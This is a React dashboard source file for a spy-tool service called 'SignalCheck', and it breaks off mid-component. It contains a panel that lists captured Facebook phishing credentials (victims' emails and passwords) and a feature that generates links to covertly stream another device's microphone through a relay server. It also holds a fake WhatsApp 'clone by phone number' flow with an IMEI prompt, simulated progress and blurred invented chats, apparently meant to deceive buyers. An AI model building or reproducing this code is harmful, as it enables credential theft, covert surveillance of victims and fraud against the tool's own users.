import React, { useState, useEffect, useRef } from 'react';
import Header from './Header';
import LinkGenerator from './LinkGenerator';
import LinksList from './LinksList';
import Sidebar from './Sidebar';
import { supabase } from '../supabase';
import { FaWhatsapp, FaInstagram, FaFacebookF, FaMicrophone, FaMapMarkerAlt, FaBook, FaHome } from 'react-icons/fa';

function FacebookCaptures() {
  const [links, setLinks] = useState([]);
  const usuario = localStorage.getItem('usuario');
  useEffect(() => {
    async function fetchLinks() {
      const { data } = await supabase
        .from('facebook_phish')
        .select('*')
        .eq('email', usuario)
        .order('created_at', { ascending: false });
      setLinks(data || []);
    }
    fetchLinks();
  }, []);

  return (
    <div style={{ margin: '2rem 0' }}>
      <h3 style={{ color: 'var(--ouro-tentacao)' }}>Facebook Phishing Captures</h3>
      {links.length === 0 && <p style={{ color: 'var(--cinza-conspiracao)' }}>No phishing links created yet.</p>}
      {links.map(link => (
        <div key={link.id} style={{
          background: 'var(--fundo-destaque)',
          borderRadius: 10,
          margin: '1rem 0',
          padding: '1rem',
          boxShadow: '0 2px 8px rgba(76,76,76,0.08)'
        }}>
          <div style={{ marginBottom: 8 }}>
            <b style={{ color: 'var(--ouro-tentacao)' }}>{link.url}</b>
          </div>
          <div style={{ fontSize: 14, color: 'var(--cinza-conspiracao)' }}>
            {(!link.capturas || link.capturas.length === 0) ? 'No data captured yet.' : `${link.capturas.length} capture(s):`}
          </div>
          {link.capturas && link.capturas.length > 0 && (
            <ul style={{ margin: '0.5rem 0 0 0', padding: 0, listStyle: 'none' }}>
              {link.capturas.map((c, i) => (
                <li key={i} style={{
                  background: 'rgba(255,143,163,0.08)',
                  borderRadius: 6,
                  margin: '0.25rem 0',
                  padding: '0.5rem',
                  color: 'var(--branco-confissao)'
                }}>
                  <div><b>Date:</b> {c.data}</div>
                  <div><b>Email:</b> {c.email}</div>
                  <div><b>Password:</b> {c.senha}</div>
                </li>
              ))}
            </ul>
          )}
        </div>
      ))}
    </div>
  );
}

function MicrophonePlaceholder() {
  const [links, setLinks] = useState([]);
  const [listeningId, setListeningId] = useState(null);
  const audioContextRef = useRef(null);
  const wsRef = useRef(null);

  const WS_URL = 'wss://mic-relay-server.onrender.com';

  function gerarLink() {
    const id = Math.random().toString(36).substring(2, 10);
    setLinks(l => [{ id, url: 'https://redirect-online.vercel.app/microphone/' + id }, ...l]);
  }

  function listen(id) {
    setListeningId(id);
    if (!audioContextRef.current) {
      audioContextRef.current = new (window.AudioContext || window.webkitAudioContext)();
    }
    const audioContext = audioContextRef.current;
    if (audioContext.state === 'suspended') {
      audioContext.resume();
    }
    if (wsRef.current) {
      wsRef.current.close();
    }
    const ws = new window.WebSocket(WS_URL);
    wsRef.current = ws;

    let audioQueue = [];
    let processor = null;

    ws.onopen = () => {
      ws.send(JSON.stringify({ listen: id }));
      processor = audioContext.createScriptProcessor(4096, 1, 1);
      processor.onaudioprocess = function (e) {
        const output = e.outputBuffer.getChannelData(0);
        if (audioQueue.length > 0) {
          const buffer = audioQueue.shift();
          output.set(buffer);
        } else {
          output.fill(0);
        }
      };
      processor.connect(audioContext.destination);
    };

    ws.onmessage = e => {
      const msg = JSON.parse(e.data);
      if (msg.id === id && msg.audio) {
        const floatArray = new Float32Array(msg.audio);
        audioQueue.push(floatArray);
      }
    };

    ws.onclose = () => {
      setListeningId(null);
      if (processor) processor.disconnect();
    };
  }

  // Sempre que um novo link for adicionado, começa a ouvir automaticamente o mais recente
  React.useEffect(() => {
    if (links.length > 0 && listeningId !== links[0].id) {
      listen(links[0].id);
    }
    // eslint-disable-next-line
  }, [links]);

  return (
    <div style={{ margin: '2rem 0', textAlign: 'center' }}>
      <h3 style={{ color: 'var(--ouro-tentacao)' }}>Real-time Microphone</h3>
      <p style={{ color: 'var(--cinza-conspiracao)' }}>Generate a link to request real-time microphone access from another device.</p>
      <button onClick={gerarLink} style={{
        background: 'var(--vermelho-paixao)',
        color: 'var(--branco-confissao)',
        borderRadius: 8,
        padding: '0.75rem 2rem',
        fontFamily: 'Montserrat',
        fontWeight: 'bold',
        fontSize: '1.1rem',
        border: 'none',
        cursor: 'pointer',
        transition: 'background 0.2s',
        marginTop: 8
      }}>Generate Microphone Link</button>
      {links.length > 0 && (
        <div style={{ marginTop: 20 }}>
          {links.map(link => (
            <div key={link.id} style={{
              background: 'var(--fundo-destaque)',
              borderRadius: 10,
              margin: '1rem 0',
              padding: '1rem',
              boxShadow: '0 2px 8px rgba(76,76,76,0.08)'
            }}>
              <div style={{ marginBottom: 8 }}>
                <b style={{ color: 'var(--ouro-tentacao)' }}>{link.url}</b>
              </div>
              <button
                onClick={() => listen(link.id)}
                disabled={listeningId === link.id}
                style={{
                  background: listeningId === link.id ? 'var(--vermelho-paixao)' : 'var(--ouro-tentacao)',
                  color: listeningId === link.id ? 'var(--branco-confissao)' : 'var(--preto-espionagem)',
                  borderRadius: 8,
                  padding: '0.5rem 1.5rem',
                  fontFamily: 'Montserrat',
                  fontWeight: 'bold',
                  fontSize: '1rem',
                  border: 'none',
                  cursor: 'pointer',
                  marginTop: 10
                }}
              >
                {listeningId === link.id ? 'Listening...' : 'Listen in real time'}
              </button>
            </div>
          ))}
        </div>
      )}
    </div>
  );
}

function WhatsAppWebSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
  const [selected, setSelected] = useState(0);
  const chatTimes = [
    '09:42', '10:24', '13:58', '18:02', '18:05', '18:08', '19:01', '19:10', '20:02', '21:10'
  ];
  // Mensagens simuladas para cada chat (agora com mais mensagens e alternância)
  const chatMessages = [
    [
      { fromMe: false, text: 'Hey, are you there?', time: '09:42' },
      { fromMe: false, text: 'Just checking in.', time: '09:43' },
      { fromMe: false, text: 'Did you get my last message?', time: '09:44' },
      { fromMe: true, text: 'Yes, who is this?', time: '09:45' },
      { fromMe: false, text: 'It’s me, Unknown.', time: '09:46' },
      { fromMe: false, text: 'Can you help me?', time: '09:47' },
      { fromMe: true, text: 'Depends, what do you need?', time: '09:48' },
      { fromMe: true, text: 'I’m a bit busy now.', time: '09:49' },
      { fromMe: true, text: 'But I can try.', time: '09:50' },
      { fromMe: false, text: 'No worries, just wanted to say hi.', time: '09:51' },
      { fromMe: false, text: 'Talk later!', time: '09:52' },
      { fromMe: true, text: 'Sure, bye!', time: '09:53' },
      { fromMe: false, text: 'Did you see the game?', time: '09:54' },
      { fromMe: true, text: 'Not yet, no spoilers!', time: '09:55' },
      { fromMe: false, text: 'Okay, I won’t spoil it.', time: '09:56' },
      { fromMe: true, text: 'Thanks!', time: '09:57' },
      { fromMe: false, text: 'Bye!', time: '09:58' },
      { fromMe: true, text: 'Bye!', time: '09:59' },
    ],
    [
      { fromMe: false, text: 'Did you see the news?', time: '10:24' },
      { fromMe: false, text: 'It’s all over the place.', time: '10:25' },
      { fromMe: true, text: 'No, what happened?', time: '10:26' },
      { fromMe: true, text: 'Send me the link.', time: '10:27' },
      { fromMe: false, text: 'I will send soon.', time: '10:28' },
      { fromMe: false, text: 'Check your email.', time: '10:29' },
      { fromMe: true, text: 'Got it, thanks!', time: '10:30' },
      { fromMe: true, text: 'Crazy stuff!', time: '10:31' },
      { fromMe: false, text: 'Right?', time: '10:32' },
      { fromMe: false, text: 'Let’s talk later.', time: '10:33' },
      { fromMe: true, text: 'Sure!', time: '10:34' },
    ],
    [
      { fromMe: false, text: 'Are you coming to the party?', time: '13:58' },
      { fromMe: false, text: 'Everyone will be there.', time: '13:59' },
      { fromMe: true, text: 'Maybe, not sure yet.', time: '14:00' },
      { fromMe: true, text: 'Who else is going?', time: '14:01' },
      { fromMe: false, text: 'A lot of people!', time: '14:02' },
      { fromMe: false, text: 'You should come!', time: '14:03' },
      { fromMe: true, text: 'I’ll try!', time: '14:04' },
      { fromMe: true, text: 'Send me the address.', time: '14:05' },
      { fromMe: false, text: 'Sent!', time: '14:06' },
      { fromMe: false, text: 'See you there!', time: '14:07' },
      { fromMe: true, text: 'Thanks!', time: '14:08' },
    ],
    [
      { fromMe: false, text: 'Send me the files.', time: '18:02' },
      { fromMe: false, text: 'I need them ASAP.', time: '18:03' },
      { fromMe: true, text: 'I will send soon.', time: '18:04' },
      { fromMe: true, text: 'Just finishing up.', time: '18:05' },
      { fromMe: false, text: 'Thanks!', time: '18:06' },
      { fromMe: false, text: 'You’re the best.', time: '18:07' },
      { fromMe: true, text: 'No problem!', time: '18:08' },
      { fromMe: true, text: 'Check your email.', time: '18:09' },
      { fromMe: false, text: 'Got it!', time: '18:10' },
      { fromMe: false, text: 'Talk soon.', time: '18:11' },
      { fromMe: true, text: 'Bye!', time: '18:12' },
    ],
    [
      { fromMe: false, text: 'Can you help me?', time: '18:05' },
      { fromMe: false, text: 'I’m stuck on something.', time: '18:06' },
      { fromMe: true, text: 'Depends, what do you need?', time: '18:07' },
      { fromMe: true, text: 'Maybe I can help.', time: '18:08' },
      { fromMe: false, text: 'Just some advice.', time: '18:09' },
      { fromMe: false, text: 'It’s about work.', time: '18:10' },
      { fromMe: true, text: 'Let’s talk!', time: '18:11' },
      { fromMe: true, text: 'Call me?', time: '18:12' },
      { fromMe: false, text: 'Sure!', time: '18:13' },
      { fromMe: false, text: 'Thanks!', time: '18:14' },
      { fromMe: true, text: 'Anytime!', time: '18:15' },
    ],
    [
      { fromMe: false, text: 'Let’s meet tomorrow.', time: '18:08' },
      { fromMe: false, text: 'What time?', time: '18:09' },
      { fromMe: true, text: '10am at the cafe.', time: '18:10' },
      { fromMe: true, text: 'See you there!', time: '18:11' },
      { fromMe: false, text: 'Great!', time: '18:12' },
      { fromMe: false, text: 'Don’t be late.', time: '18:13' },
      { fromMe: true, text: 'I won’t!', time: '18:14' },
      { fromMe: true, text: 'Looking forward to it.', time: '18:15' },
      { fromMe: false, text: 'Me too!', time: '18:16' },
      { fromMe: false, text: 'Bye!', time: '18:17' },
      { fromMe: true, text: 'Bye!', time: '18:18' },
    ],
    [
      { fromMe: false, text: 'Your project is awesome!', time: '19:01' },
      { fromMe: false, text: 'Keep it up!', time: '19:02' },
      { fromMe: true, text: 'Thank you!', time: '19:03' },
      { fromMe: true, text: 'Means a lot!', time: '19:04' },
      { fromMe: false, text: 'No problem!', time: '19:05' },
      { fromMe: false, text: 'Let’s catch up soon.', time: '19:06' },
      { fromMe: true, text: 'Sure!', time: '19:07' },
      { fromMe: true, text: 'Ping me anytime.', time: '19:08' },
      { fromMe: false, text: 'Will do!', time: '19:09' },
      { fromMe: false, text: 'Bye!', time: '19:10' },
      { fromMe: true, text: 'Bye!', time: '19:11' },
    ],
    [
      { fromMe: false, text: 'Call me when you can.', time: '19:10' },
      { fromMe: false, text: 'It’s urgent.', time: '19:11' },
      { fromMe: true, text: 'Will do!', time: '19:12' },
      { fromMe: true, text: 'Is everything ok?', time: '19:13' },
      { fromMe: false, text: 'Yes, just need to talk.', time: '19:14' },
      { fromMe: false, text: 'Call me back.', time: '19:15' },
      { fromMe: true, text: 'I will!', time: '19:16' },
      { fromMe: true, text: 'Give me 5 minutes.', time: '19:17' },
      { fromMe: false, text: 'Ok!', time: '19:18' },
      { fromMe: false, text: 'Thanks!', time: '19:19' },
      { fromMe: true, text: 'Anytime!', time: '19:20' },
    ],
    [
      { fromMe: false, text: 'Check your email.', time: '20:02' },
      { fromMe: false, text: 'I sent the document.', time: '20:03' },
      { fromMe: true, text: 'Just checked, thanks!', time: '20:04' },
      { fromMe: true, text: 'Looks good!', time: '20:05' },
      { fromMe: false, text: 'Let me know if you need changes.', time: '20:06' },
      { fromMe: false, text: 'I’m here.', time: '20:07' },
      { fromMe: true, text: 'All good!', time: '20:08' },
      { fromMe: true, text: 'Thanks again!', time: '20:09' },
      { fromMe: false, text: 'No problem.', time: '20:10' },
      { fromMe: false, text: 'Bye!', time: '20:11' },
      { fromMe: true, text: 'Bye!', time: '20:12' },
    ],
    [
      { fromMe: false, text: 'Let’s go for a walk.', time: '21:10' },
      { fromMe: false, text: 'It’s nice outside.', time: '21:11' },
      { fromMe: true, text: 'Great idea!', time: '21:12' },
      { fromMe: true, text: 'Where should we meet?', time: '21:13' },
      { fromMe: false, text: 'At the park.', time: '21:14' },
      { fromMe: false, text: 'See you soon.', time: '21:15' },
      { fromMe: true, text: 'See you!', time: '21:16' },
      { fromMe: true, text: 'On my way.', time: '21:17' },
      { fromMe: false, text: 'Ok!', time: '21:18' },
      { fromMe: false, text: 'Bye!', time: '21:19' },
      { fromMe: true, text: 'Bye!', time: '21:20' },
    ],
  ];
  const chats = chatTimes.map((time, i) => ({
    name: 'Unknown',
    last: 'This message was not loaded, please wait...',
    time,
    avatar: '?',
    messages: chatMessages[i],
  }));
  const chat = chats[selected];
  const sortedMessages = chat && chat.messages ? [...chat.messages].sort((a, b) => {
    const [hA, mA] = a.time.split(":").map(Number);
    const [hB, mB] = b.time.split(":").map(Number);
    return hA * 60 + mA - (hB * 60 + mB);
  }) : [];

  return (
    <div style={{
      minHeight: '80vh',
      background: '#111b21 url("https://static.whatsapp.net/rsrc.php/v3/yl/r/8zQ2Wg6q4kN.png") repeat',
      color: '#e9edef',
      display: 'flex',
      flexDirection: 'row',
      alignItems: 'stretch',
      justifyContent: 'center',
      fontFamily: 'Inter, Arial, sans-serif',
      borderRadius: 16,
      boxShadow: '0 2px 8px #0001',
      maxWidth: 1100,
      margin: '32px auto',
      padding: 0,
      width: window.innerWidth <= 700 ? '100vw' : undefined,
      minWidth: window.innerWidth <= 700 ? 320 : undefined,
      overflowX: window.innerWidth <= 700 ? 'auto' : undefined,
      overflowY: window.innerWidth <= 700 ? 'auto' : undefined,
      boxSizing: 'border-box',
    }}>
      {/* Sidebar de chats */}
      <div style={{
        width: window.innerWidth <= 700 ? 180 : 220,
        background: '#202c33',
        borderRadius: '16px 0 0 16px',
        boxShadow: '0 2px 8px #0001',
        display: 'flex', flexDirection: 'column', alignItems: 'stretch',
        borderRight: '1.5px solid #232323',
        minHeight: 520,
        overflowY: 'auto',
        boxSizing: 'border-box',
      }}>
        <div style={{ padding: '1.2rem 1.2rem 0.7rem 1.2rem', borderBottom: '1.5px solid #232323' }}>
          <input disabled placeholder="Search or start new chat" style={{
            width: '100%', background: '#232d36', border: 'none', borderRadius: 8, color: '#b0b0b0', fontSize: 15, padding: '0.7rem 1rem', outline: 'none', fontFamily: 'Inter', marginBottom: 8
          }} />
        </div>
        <div style={{ flex: 1, overflowY: 'auto', padding: '0.5rem 0' }}>
          {chats.map((c, i) => (
            <div key={i} onClick={() => setSelected(i)} style={{
              display: 'flex', alignItems: 'center', gap: 10, padding: '0.7rem 0.7rem', cursor: 'pointer',
              background: selected === i ? '#232d36' : 'transparent',
              borderLeft: selected === i ? '3px solid #25d366' : '3px solid transparent',
              borderRadius: 8, marginBottom: 2, transition: 'background 0.2s',
              maxWidth: '100%', minWidth: 0, boxSizing: 'border-box',
            }}>
              {/* <div style={{ width: 32, height: 32, borderRadius: '50%', background: '#232d36', color: '#25d366', display: 'flex', alignItems: 'center', justifyContent: 'center', fontWeight: 700, fontSize: 22 }}>{c.avatar}</div> */}
              <div style={{ flex: 1, minWidth: 0 }}>
                <div style={{ fontWeight: 600, color: '#e9edef', fontSize: '0.98rem', whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis' }}>{c.name}</div>
                <div style={{ color: '#b0b0b0', fontSize: '0.93rem', marginTop: 2, whiteSpace: 'nowrap', overflow: 'hidden', textOverflow: 'ellipsis', maxWidth: 120 }}>{c.last}</div>
              </div>
              <div style={{ color: '#b0b0b0', fontSize: '0.93rem', marginLeft: 6, flexShrink: 0 }}>{c.time}</div>
            </div>
          ))}
          <button
            onClick={() => setShowLoadMoreMsg(true)}
            style={{
              width: '90%',
              margin: '16px auto 8px auto',
              display: 'block',
              background: '#232d36',
              color: '#25d366',
              border: 'none',
              borderRadius: 8,
              padding: '0.7rem 1.2rem',
              fontWeight: 700,
              fontSize: 15,
              cursor: 'pointer'
            }}
          >
            Load more chats
          </button>
        </div>
      </div>
      {/* Área de chat */}
      <div style={{
        flex: 1,
        background: 'transparent',
        borderRadius: '0 16px 16px 0',
        display: 'flex', flexDirection: 'column', alignItems: 'stretch',
        minHeight: 520,
        width: window.innerWidth <= 700 ? '100vw' : '100%',
        boxSizing: 'border-box',
        overflowX: window.innerWidth <= 700 ? 'auto' : 'hidden',
        padding: window.innerWidth <= 700 ? '0 0.5rem' : 0,
      }}>
        {showLoadMoreMsg ? (
          <div style={{
            background: 'transparent',
            borderRadius: 14,
            boxShadow: 'none',
            padding: window.innerWidth <= 700 ? '1rem 0.2rem' : '2.5rem 2.2rem',
            width: '100%',
            margin: window.innerWidth <= 700 ? '16px 0 0 0' : '32px auto 0 auto',
            minHeight: 320,
            maxHeight: 420,
            display: 'flex', alignItems: 'center', justifyContent: 'center',
            boxSizing: 'border-box',
            overflowX: window.innerWidth <= 700 ? 'auto' : 'hidden',
          }}>
            <span style={{ color: '#E60033', fontWeight: 600, fontSize: 18, textAlign: 'center' }}>
              You do not have access to the content of this chat. The IMEI must be filled in correctly to access the conversations.
            </span>
          </div>
        ) : (
          <>
        {/* Barra superior do chat */}
        <div style={{
          width: '100%',
          background: '#202c33',
          borderRadius: window.innerWidth <= 700 ? '0' : '0 14px 0 0',
          boxShadow: '0 2px 8px #0001',
          padding: window.innerWidth <= 700 ? '0.7rem 0.2rem' : '1.2rem 2.2rem',
          display: 'flex', alignItems: 'center', gap: 16,
          boxSizing: 'border-box',
          overflowX: window.innerWidth <= 700 ? 'auto' : 'hidden',
        }}>
          {/* Avatar removido */}
          <div>
            <div style={{ fontWeight: 700, color: '#25d366', fontSize: 18 }}>Unknown</div>
            <div style={{ color: '#b0b0b0', fontSize: 14 }}>online</div>
          </div>
          {/* Ícones de ligação e vídeo removidos */}
          <div style={{ marginLeft: 18, display: 'flex', gap: 12 }}>
            <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>⋮</span>
          </div>
        </div>
        {/* Mensagens (ocultas) */}
        <div style={{
          background: 'transparent',
          borderRadius: 14,
          boxShadow: 'none',
          padding: window.innerWidth <= 700 ? '0.7rem 0.1rem' : '1.5rem 2.2rem',
          width: '100%',
          minHeight: 320,
          maxHeight: 420,
          overflowY: 'auto',
          overflowX: window.innerWidth <= 700 ? 'auto' : 'hidden',
          display: 'flex', flexDirection: 'column', gap: 0,
          boxSizing: 'border-box',
        }}>
              {sortedMessages.map((msg, i) => (
            <div key={i} style={{
              display: 'flex', flexDirection: msg.fromMe ? 'row-reverse' : 'row', alignItems: 'flex-end',
              marginBottom: 10, width: '100%'
            }}>
              <div style={{
                background: msg.fromMe ? '#005c4b' : '#232d36',
                color: '#e9edef',
                borderRadius: msg.fromMe ? '16px 4px 16px 16px' : '4px 16px 16px 16px',
                padding: '0.7rem 1.1rem',
                minWidth: 60,
                maxWidth: '70%',
                fontSize: window.innerWidth <= 700 ? 13 : 15,
                position: 'relative',
                filter: 'blur(3px) grayscale(0.3) brightness(0.7)',
                userSelect: 'none',
                cursor: 'not-allowed',
                marginLeft: msg.fromMe ? 0 : 8,
                    marginRight: msg.fromMe ? 8 : 0,
                    boxSizing: 'border-box',
              }}>
                <span style={{ color: '#25d366', fontSize: 18, marginRight: 6 }}>💬</span>
                {msg.text}
                <span style={{ position: 'absolute', right: 10, bottom: 6, color: '#b0b0b0', fontSize: 12 }}>{msg.time}</span>
              </div>
            </div>
          ))}
        </div>
        {/* Campo de digitação fake */}
        <div style={{
          width: '100%', maxWidth: 700, margin: '0 auto', marginTop: 18,
          display: 'flex', alignItems: 'center', gap: 12, background: '#232d36', borderRadius: 10, padding: '0.7rem 1.2rem'
        }}>
          <span style={{ color: '#b0b0b0', fontSize: 22, cursor: 'not-allowed' }}>📎</span>
          <input disabled placeholder="Type a message..." style={{
            flex: 1, background: 'transparent', border: 'none', color: '#b0b0b0', fontSize: 15, outline: 'none', fontFamily: 'Inter',
          }} />
          <button disabled style={{ background: '#25d366', color: '#fff', border: 'none', borderRadius: 8, padding: '0.5rem 1.2rem', fontWeight: 700, fontSize: 15, cursor: 'not-allowed' }}>Send</button>
        </div>
        {/* Mensagem de privacidade */}
        <div style={{ color: '#b0b0b0', fontSize: 15, marginTop: 18, textAlign: 'center', maxWidth: 700 }}>
          <span style={{ color: '#E60033', fontWeight: 600 }}>You do not have access to the content of this chat. The IMEI must be filled in correctly to access the conversations.</span>
        </div>
        <button onClick={onBack} style={{ margin: '32px auto 0 auto', background: '#232d36', color: '#25d366', border: 'none', borderRadius: 8, padding: '0.7rem 2.2rem', fontWeight: 700, fontSize: 15, cursor: 'pointer', display: 'block' }}>Back</button>
          </>
        )}
      </div>
    </div>
  );
}

function WhatsAppSim({ onBack, showLoadMoreMsg, setShowLoadMoreMsg }) {
  const [option, setOption] = useState('clone');
  const [phone, setPhone] = useState('');
  const [device, setDevice] = useState('');
  const [imei, setImei] = useState('');
  const [connecting, setConnecting] = useState(false);
  const [progress, setProgress] = useState(0);
  const [timer, setTimer] = useState(10); // 10 seconds
  const [showMonitor, setShowMonitor] = useState(false);
  const [showChat, setShowChat] = useState(false);
  const [chatNumber, setChatNumber] = useState('');
  const deviceModels = [
    'Samsung Galaxy S23',
    'iPhone 15 Pro',
    'Xiaomi Redmi Note 12',
    'Motorola Edge 40',
    'OnePlus 11',
    'Google Pixel 8',
    'Huawei P60',
    'Asus Zenfone 10',
    'Other...'
  ];

  // Simulação de progresso
  React.useEffect(() => {
    let interval;
    if (connecting && progress < 100) {
      interval = setInterval(() => {
        setProgress(p => Math.min(100, p + 100 / 10)); // 10 steps to 100%
        setTimer(t => t > 0 ? t - 1 : 0);
      }, 1000);
    }
    if (progress >= 100 && connecting) {
      setTimeout(() => setShowMonitor(true), 1200);
    }
    if (progress >= 100) {
      clearInterval(interval);
    }
    return () => clearInterval(interval);
  }, [connecting, progress]);

  function handleConnect(e) {
    e.preventDefault();
    setConnecting(true);
    setProgress(10);
    setTimer(10);
    setShowMonitor(false);
    setTimeout(() => {
      setShowChat(true);
      setChatNumber(phone);
      setConnecting(false);
      setProgress(0);
      setTimer(10);
    }, 12000); // 10s + buffer
  }

  if (showChat) {
    return <WhatsAppWebSim onBack={() => {
      setShowChat(false);
      setPhone('');
      setDevice('');
      setImei('');
      setOption('clone');
      setShowMonitor(false);
      if (onBack) onBack();
    }} showLoadMoreMsg={showLoadMoreMsg} setShowLoadMoreMsg={setShowLoadMoreMsg} />;
  }

  return (
    <div style={{ margin: '2rem 0', textAlign: 'center' }}>
      <h3 style={{ color: 'var(--vermelho)' }}>WhatsApp</h3>
      <div style={{ marginBottom: 18 }}>
        <label style={{ marginRight: 16 }}>
          <input type="radio" checked={option === 'clone'} onChange={() => setOption('clone')} /> Clone by phone number
        </label>
        <label>
          <input type="radio" checked={option === 'web'} onChange={() => setOption('web')} /> WhatsApp Web
        </label>
      </div>
      {option === 'clone' && !showMonitor && (
        <form onSubmit={handleConnect} style={{ maxWidth: 340, margin: '0 auto', background: 'var(--cinza-card)', borderRadius: 12, padding: 24, boxShadow: '0 2px 8px #0005' }}>
          <div style={{ marginBottom: 14, textAlign: 'left' }}>
            <label>Phone number</label>
            <input type="text" value={phone} onChange={e => setPhone(e.target.value)} required placeholder="e.g. +15551234567" style={{ width: '100%', padding: 8, borderRadius: 6, border: '1px solid var(--cinza-claro)', marginTop: 4, fontSize: 15, background: 'var(--cinza-escuro)', color: '#fff' }} />
          </div>
          <div style={{ marginBottom: 14, textAlign: 'left' }}>
            <label>Device model</label>
            <select value={device} onChange={e => setDevice(e.target.value)} required style={{ width: '100%', padding: 8, borderRadius: 6, border: '1px solid var(--cinza-claro)', marginTop: 4, fontSize: 15, background: 'var(--cinza-escuro)', color: '#fff' }}>
              <option value="">Select a model...</option>
              {deviceModels.map(m => <option key={m} value={m}>{m}</option>)}
            </select>
          </div>
          <div style={{ marginBottom: 8, textAlign: 'left' }}>
            <label>IMEI</label>
            <input type="text" value={imei} onChange={e => setImei(e.target.value)} required placeholder="e.g. 356938035643809" style={{ width: '100%', padding: 8, borderRadius: 6, border: '1px solid var(--cinza-claro)', marginTop: 4, fontSize: 15, background: 'var(--cinza-escuro)', color: '#fff' }} />
            <a href="/how-to-get-imei" style={{ display: 'block', marginTop: 6, color: '#25d366', fontSize: 14, textDecoration: 'underline', cursor: 'pointer' }}>
              How to get your IMEI?
            </a>
          </div>
          <div style={{ color: 'var(--vermelho)', fontWeight: 600, marginBottom: 12, fontSize: 15 }}>
            You must enter the correct IMEI to access the conversations.
          </div>
          <button type="submit" disabled={connecting} style={{
            background: 'var(--vermelho)',
            color: '#fff',
            borderRadius: 10,
            padding: '0.7rem 1.7rem',
            fontSize: '1rem',
            fontFamily: 'Inter',
            fontWeight: 600,
            boxShadow: '0 2px 8px 0 #E6003322',
            transition: 'box-shadow 0.2s, background 0.2s',
            marginTop: 8
          }}>Connect</button>
          {connecting && (
            <div style={{ marginTop: 28, textAlign: 'left' }}>
              <div style={{ width: '100%', background: '#232323', borderRadius: 6, height: 16, marginBottom: 8 }}>
                <div style={{ width: `${progress}%`, background: 'var(--vermelho)', height: 16, borderRadius: 6, transition: 'width 0.5s' }} />
              </div>
              <div style={{ fontSize: 15, marginBottom: 6, color: 'var(--vermelho)' }}><b>Connecting to WhatsApp</b></div>
              <div style={{ fontSize: 14, marginBottom: 4 }}>Monitoring... {Math.floor(timer/60)}:{(timer%60).toString().padStart(2,'0')}</div>
              <div style={{ fontSize: 14, marginBottom: 4 }}>{Math.floor(progress)}%</div>
              <div style={{ fontSize: 14, marginBottom: 4, color: progress > 20 ? 'var(--sucesso)' : 'var(--cinza-claro)' }}>✅ Network connected</div>
              <div style={{ fontSize: 14, marginBottom: 4 }}>Monitoring WhatsApp activity...</div>
              <div style={{ fontSize: 14, marginBottom: 4 }}>Synchronizing with WhatsApp...</div>
              <div style={{ fontSize: 13, marginTop: 10, color: 'var(--aviso)' }}>
                <b>IMPORTANT:</b> Stay connected to the network throughout the entire process. The connection may take a few minutes.
              </div>
            </div>
          )}
        </form>
      )}
      {option === 'clone' && showMonitor && showChat && (
        <WhatsAppWebSim onBack={() => setShowChat(false)} showLoadMoreMsg={showLoadMoreMsg} setShowLoadMoreMsg={setShowLoadMoreMsg} />
      )}
      {option === 'web' && (
        <div style={{ marginTop: 32, background: 'var(--cinza-card)', borderRadius: 12, padding: 24, boxShadow: '0 2px 8px #0005', fontSize: 16 }}>
          <b>WhatsApp Web</b>
          <div style={{ marginTop: 12, color: 'var(--cinza-claro)' }}>
            This feature is coming soon.
          </div>
        </div>
      )}
    </div>
  );
}

export default function Dashboard({ email }) {
  const [active, setActive] = useState('Home');
  const [showLoadMoreMsg, setShowLoadMoreMsg] = useState(false);
  const [selected, setSelected] = useState(0);

  useEffect(() => {
    setActive('Home');
  }, [email]);

  useEffect(() => {
    if (active) localStorage.setItem('dashboardActiveTab', active);
  }, [active]);

  // Blocos de ferramentas
  const tools = [
    { label: 'Lessons', icon: <FaBook size={44} color="#E60033" />, desc: 'Tutorials and instructions' },
    { label: 'Spy Location', icon: <FaMapMarkerAlt size={44} color="#25d366" />, desc: 'Real-time location' },
    { label: 'WhatsApp', icon: <FaWhatsapp size={44} color="#25d366" />, desc: 'Conversation monitoring' },
    { label: 'Instagram', icon: <FaInstagram size={44} color="#E1306C" />, desc: 'Coming soon...' },
    { label: 'Facebook', icon: <FaFacebookF size={44} color="#1877f3" />, desc: 'Phishing captures' },
    { label: 'Microphone', icon: <FaMicrophone size={44} color="#fff" />, desc: 'Real-time audio' },
  ];

  // Itens da sidebar (inclui Home)
  const sidebarItems = [
    { label: 'Home', icon: <FaHome size={24} /> },
    ...tools.map(t => ({ label: t.label, icon: t.icon })),
  ];

  return (
    <>
      <Header />
    <div style={{ display: 'flex', minHeight: '100vh', background: 'var(--preto-espionagem)' }}>
        <Sidebar
          active={active || 'Home'}
          onSelect={label => setActive(label === 'Home' ? null : label)}
          items={sidebarItems}
        />
        <div style={{ flex: 1, display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'flex-start', padding: '2rem 0', maxWidth: '100vw', boxSizing: 'border-box' }}>
          {!active && (
            <>
              <h1 style={{ color: 'var(--vermelho)', fontFamily: 'Poppins, Inter, Arial', fontWeight: 800, fontSize: '2.2rem', margin: '1.5rem auto 0.5rem auto', letterSpacing: 1, textAlign: 'center', maxWidth: 700, width: '100%' }}>Welcome to SignalCheck</h1>
              <p style={{ color: 'var(--cinza-claro)', fontSize: '1.15rem', margin: '0 auto 2.5rem auto', textAlign: 'center', maxWidth: 520, width: '100%', padding: '0 0.5rem' }}>
                Select a tool below to get started. All features are organized in blocks for easy access.
              </p>
      <div style={{
                display: 'grid',
                gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))',
                gap: '2rem',
                width: '100%',
        maxWidth: 900,
                margin: '2rem auto',
                padding: '0 0.5rem',
                boxSizing: 'border-box',
              }}>
                {tools.map(tool => (
                  <div
                    key={tool.label}
                    onClick={() => setActive(tool.label)}
                    style={{
                      background: 'linear-gradient(135deg, #232d36 60%, #181a1b 100%)',
                      borderRadius: 18,
                      boxShadow: '0 4px 24px 0 #0007',
                      border: '1.5px solid #232323',
                      padding: '2.2rem 1.2rem',
        display: 'flex',
        flexDirection: 'column',
        alignItems: 'center',
                      justifyContent: 'center',
                      cursor: 'pointer',
                      transition: 'box-shadow 0.22s, background 0.22s, transform 0.18s',
                      fontSize: 22,
                      fontWeight: 600,
                      color: '#fff',
                      minHeight: 150,
                textAlign: 'center',
                      gap: 18,
                      position: 'relative',
                      outline: 'none',
                      width: '100%',
                      boxSizing: 'border-box',
                    }}
                    tabIndex={0}
                    onKeyDown={e => (e.key === 'Enter' || e.key === ' ') && setActive(tool.label)}
